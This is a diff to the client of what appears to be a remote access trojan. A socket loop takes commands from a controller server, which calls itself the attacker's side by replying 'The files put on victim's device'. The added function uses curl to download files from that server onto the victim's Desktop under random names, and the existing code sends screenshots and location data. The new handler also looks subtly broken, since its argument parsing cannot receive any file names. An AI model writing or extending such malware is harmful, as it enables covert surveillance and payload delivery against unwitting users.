@@ -9,6 +9,22 @@ SERVER_URL = "http://192.168.88.105:2020"
 import shlex
 import pyautogui
 import random
+def put_files_in_desktop(args):
+    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
+    files_to_put = args[1:]
+    if not files_to_put:
+        print("No files to put")
+        return
+    urls = []
+    for arg in args:
+        urls.append(f"{SERVER_URL}/uploads/{arg}")
+    for url in urls:
+       name = "".join(random.choice(chars) for _ in range(10))
+       ext = url.split(".")[-1]
+       filename = f"{name}.{ext}"
+       path = os.path.join(desktop_path, filename)
+       subprocess.run(["curl", "-L", "-o", path, url])
 def send_screenshot():
     filename = f"{random.randint(100000,999999)}.png"
     full_path = os.path.abspath(filename)
@@ -116,6 +132,11 @@ def connect_back():
         try:
             cmd = s.recv(1024).decode("utf-8").strip()
             if not cmd:
+                continue
+            if cmd == "put-files-desktop":
+                args_files = cmd.split()
+                put_files_in_desktop(args_files)
+                s.send(b"The files put on victim's device")
                 continue
             if cmd == "get-screenshot":
                 get_location_and_send()
